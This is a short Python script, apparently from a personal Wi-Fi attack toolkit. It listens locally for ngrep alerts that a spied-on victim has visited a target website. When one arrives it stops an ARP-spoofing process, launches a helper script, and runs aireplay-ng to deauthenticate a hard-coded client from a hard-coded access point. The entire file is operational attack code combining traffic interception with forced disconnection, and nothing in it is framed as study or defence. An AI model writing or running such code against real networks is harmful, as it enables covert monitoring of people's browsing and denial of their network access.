#!/usr/bin/env python
import socket
import os
import subprocess

#listen on a dummy port to recv messages from ngrep
#via netcat

host = '127.0.0.1'
port = 1331
backlog = 5
size = 1024
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host,port))
s.listen(backlog)
while 1:
    client, address = s.accept()
    data = client.recv(size)
    if data:
        if "#" not in data:
            continue
        print "Attack!"
        #Kill arpspoof, We figured out our victim is browsing our target website
        os.system("sh arpspoofkill.sh");
        #Launch deauth
        os.system("iwconfig mon0 channel 6")
        #Launcing God process
        #God process takes care of all the shit created by Moriarity.sh
        #God process would sleep for 100 seconds untill which deauth is carried on
        #AKA victim would be disconnected for 100 seconds after visiting the target website
        p = subprocess.Popen(["sh", "/root/Moriarity/sherlock.sh"]);
        os.system("aireplay-ng -0 0 -a 20:AA:4B:C5:41:3E -c 1D:12:43:21:23:FF -e endow mon0")
